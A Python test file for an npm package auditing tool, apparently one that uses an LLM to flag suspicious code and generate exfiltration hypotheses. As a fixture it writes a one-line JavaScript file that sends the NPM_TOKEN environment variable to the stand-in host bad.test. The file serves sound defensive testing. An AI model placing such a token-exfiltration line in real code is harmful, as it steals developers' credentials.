from kit_llm import ScriptedLlm, ToolOutputStep
from kit_spine import make_engine, make_session_factory
from kit_spine.db import metadata
from npmguard.config import Settings
from npmguard.contract.models import EntryPoints
from npmguard.llm_runtime import build_npmguard_llm
from npmguard.phases import Flag, FlagDraft, KitHypothesisGenerator, PackageIntent


def test_flag_draft_normalizes_common_provider_line_shapes() -> None:
    assert FlagDraft.model_validate(
        {"line_range": "3-6", "reason": "environment gate"}
    ).model_dump() == {"lines": ["3-6"], "why": "environment gate"}
    assert FlagDraft.model_validate(
        {
            "lineRanges": [[3, 3], [79, 80]],
            "description": "encoded control characters",
        }
    ).model_dump() == {
        "lines": ["3-3", "79-80"],
        "why": "encoded control characters",
    }
    assert FlagDraft.model_validate({"lines": [3, 5], "why": "numeric model output"}).lines == [
        "3-3",
        "5-5",
    ]


async def test_kit_tool_transport_arms_hypothesis_after_bounded_repair(tmp_path) -> None:
    engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'llm.sqlite3'}")
    async with engine.begin() as connection:
        await connection.run_sync(metadata.create_all)
    sessions = make_session_factory(engine)
    valid = {
        "description": "index.js reads an npm token and posts it remotely",
        "claim": {"kind": "env_exfil", "gating": None},
        "severity": "high",
        "setup": [{"tool": "setEnv", "env": {"NPM_TOKEN": "canary"}}],
        "trigger": {"target": "index.js"},
    }
    provider = ScriptedLlm(
        {
            "hypothesis": [
                ToolOutputStep({"description": "missing required fields"}),
                ToolOutputStep(valid),
            ]
        }
    )
    settings = Settings(_env_file=None)
    llm = build_npmguard_llm(sessions, settings, provider=provider)
    package = tmp_path / "package"
    package.mkdir()
    (package / "index.js").write_text(
        "fetch('https://bad.test', {body: process.env.NPM_TOKEN})", encoding="utf-8"
    )
    generator = KitHypothesisGenerator(llm)
    result = await generator.generate(
        Flag(file="index.js", lines=["1-1"], why="unexpected token exfiltration"),
        package_path=package,
        intent=PackageIntent(
            statedPurpose="string utility", expectedCapabilities=[], rationale="manifest"
        ),
        entry_points=EntryPoints(install=[], runtime=["index.js"], bin=[]),
        hypothesis_id="hyp-0001",
        created_at="2026-07-20T00:00:00Z",
        audit_id="audit-1",
    )
    assert result.claim.kind == "env_exfil"
    assert [call.tool for call in result.experiment] == ["setEnv", "trigger"]
    assert result.experiment[-1].args["target"] == "index.js"
    assert provider._calls == 2
    await llm.aclose()
    await engine.dispose()
